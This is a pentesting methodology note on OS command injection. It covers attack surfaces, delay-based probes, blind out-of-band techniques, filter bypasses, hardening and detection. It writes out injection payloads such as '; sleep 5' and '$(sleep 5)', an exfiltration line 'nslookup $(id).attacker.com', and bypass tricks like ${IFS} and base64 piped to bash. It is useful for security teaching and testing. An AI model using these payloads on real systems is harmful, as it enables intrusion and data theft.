# Command injection — methodology

## Where to look

Any code path that calls a shell with user-supplied input. Most common surfaces:

- Image processing endpoints calling out to ImageMagick / ffmpeg with filename arg.
- Network-tool wrapper UIs (ping / traceroute / nslookup).
- PDF / DOC generators using LibreOffice or wkhtmltopdf.
- Git operations on user-provided URLs.
- Archive extractors that shell out to `unzip` / `7z`.
- Backup / restore features.

## Triage

1. Find the parameter that lands in `system()` / `exec()` / `subprocess.call(shell=True)` /
   `Runtime.exec(String)` / backticks.
2. Probe with a delimiter: `; sleep 5`, `| sleep 5`, `&& sleep 5`, ``$(sleep 5)``,
   `` `sleep 5` ``, newline injection `%0Asleep 5`.
3. Observe response delay. If it delays predictably, you have execution.
4. Escalate: confirm with a controlled-host out-of-band signal
   (curl to attacker-controlled URL, DNS lookup to controlled domain).

## Blind variants

When response doesn't reflect output:

- Time-based: `sleep N` and measure.
- Out-of-band: `nslookup $(id).attacker.com` — DNS query carries the data.
- Filesystem oracle: write to a file the web app serves, then fetch it back.

## Bypasses

- Whitespace filters: `${IFS}`, `<` (input redirection), `{cmd,arg1,arg2}`.
- Character blocklists: `$IFS$9`, backticks, `$()`, base64 + pipe to bash.
- Length limits: chain via writing to a file, then exec the file.

## Hardening

- Don't shell out with user input. Use the language's safe equivalent
  (Python `subprocess.run(['cmd', arg], shell=False)`, Node `execFile`).
- If you must shell out: strict allowlist of characters; pass user values as separate
  argv elements; never via a string concatenation.

## Detection

- Spike of unusual child processes (`sleep`, `curl`, `wget`, `nc`, `bash`) under the
  web-app user.
- Outbound DNS or HTTP to non-baseline hosts from web-app process.
- Process-args containing shell metacharacters in audit logs.

## References

- PortSwigger — OS command injection labs.
- OWASP Command Injection Cheat Sheet.
- LOLBAS (Living off the land binaries) — for detection-aware engagements.
